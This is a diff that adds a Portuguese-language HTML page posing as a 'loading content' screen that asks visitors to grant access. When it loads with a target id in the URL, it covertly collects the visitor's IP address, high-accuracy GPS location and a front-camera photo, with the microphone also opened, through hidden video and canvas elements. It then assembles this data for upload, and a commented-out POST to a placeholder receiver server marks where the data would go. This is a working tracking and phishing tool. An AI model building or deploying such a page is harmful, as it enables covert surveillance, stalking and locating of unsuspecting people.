@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">Carregando...</title>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .loader {
+            border: 4px solid #1e293b;
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>Carregando conteúdo...</h2>
+    <p>Por favor, permita o acesso solicitado para visualizar.</p>
+
+    <!-- Elementos ocultos para manipulação de mídia -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Extrai os parâmetros da URL (ex: ?b=p&id=7714802499)
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id');
+        const mode = urlParams.get('b');
+
+        // Função para coletar IP via API pública simples
+        async function fetchIP() {
+            try {
+                let response = await fetch('https://api64.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'Desconhecido';
+            }
+        }
+
+        // Função para capturar Geolocalização GPS
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocalização não suportada' });
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        (error) => {
+                            resolve({ error: 'Permissão negada ou indisponível' });
+                        },
+                        { enableHighAccuracy: true }
+                    );
+                }
+            });
+        }
+
+        // Função para capturar foto da Câmera
+        function captureCamera() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
+                    .then((stream) => {
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        
+                        // Aguarda o vídeo carregar para tirar a foto
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const photoData = canvas.toDataURL('image/jpeg');
+
+                            // Para a câmera e microfone após a captura
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve({ photo: photoData });
+                        }, 1500);
+                    })
+                    .catch((err) => {
+                        resolve({ error: 'Câmera/Áudio negados' });
+                    });
+            });
+        }
+
+        // Execução principal ao carregar a página
+        window.addEventListener('load', async () => {
+            if (!targetId) return;
+
+            const ip = await fetchIP();
+            const coords = await getGeolocation();
+            const media = await captureCamera();
+
+            const payload = {
+                id: targetId,
+                mode: mode,
+                ip: ip,
+                location: coords,
+                media: media,
+                timestamp: new Date().toISOString()
+            };
+
+            // Exemplo de envio dos dados recolhidos (Ponto onde integrará com seu backend/painel)
+            console.log("Dados coletados para envio:", payload);
+            
+            // Aqui você faria um fetch POST para o seu servidor ou banco de dados receptor
+            // fetch('https://seu-servidor-receptor.com/api/save', {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify(payload)
+            // });
+        });
+    </script>
+</body>
+</html>
